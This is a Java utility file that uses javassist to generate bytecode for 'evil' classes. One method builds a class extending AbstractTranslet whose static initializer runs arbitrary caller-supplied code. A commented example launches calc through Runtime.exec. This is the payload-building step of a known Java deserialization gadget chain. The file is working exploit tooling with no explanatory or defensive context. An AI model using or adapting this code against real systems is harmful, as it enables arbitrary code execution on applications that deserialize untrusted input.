package org.Tools;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;

public class setClassPool {
    public static byte[] evilClass1(String classpath) throws Exception{
        Class cls = Class.forName(classpath);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(cls.getName());
        return clazz.toBytecode();
    }

    public static byte[] evilClass2(String classpath) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("Test");
        String cmd = classpath;//"java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        return cc.toBytecode();
    }
}
